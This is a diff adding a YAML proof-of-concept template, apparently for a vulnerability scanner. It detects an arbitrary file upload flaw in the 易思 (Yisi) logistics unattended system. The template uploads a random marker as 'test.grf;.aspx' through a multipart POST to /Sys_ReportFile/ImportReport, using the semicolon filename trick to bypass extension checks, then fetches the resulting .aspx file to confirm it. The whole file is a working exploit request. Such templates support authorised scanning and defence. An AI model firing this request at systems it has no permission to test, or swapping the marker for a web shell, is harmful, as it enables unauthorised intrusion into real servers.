@@ -1,0 +1,33 @@
+id: poc-yaml-yszn-wu-liu-unattended-system-file-upload
+info:
+  name: 易思智能物流无人值守系统文件上传漏洞
+  severity: high
+  tags:
+  - 文件上传
+  finger: 易思智能物流无人值守系统
+variables:
+  t1: random_str(3)
+  t2: md5(t1)
+  t3: base64(t1)
+requests:
+- raw: 'POST /Sys_ReportFile/ImportReport?encode={{.t2}} HTTP/1.1
+
+    Content-Type: multipart/form-data; boundary= ----WebKitFormBoundaryxzUhGld6cusN3Alk
+
+
+    ------WebKitFormBoundaryxzUhGld6cusN3Alk
+
+    Content-Disposition: form-data; name="file"; .filename="test.grf;.aspx"
+
+    Content-Type: application/octet-stream
+
+
+    {{.t3}}
+
+
+    ------WebKitFormBoundaryxzUhGld6cusN3Alk--'
+  expression: status_code == 200 && contains(body,t2)
+- method: GET
+  path: /GRF/Custom/{{.t2}}.aspx
+  expression: status_code == 200 && contains(body,t3)
+transport: http
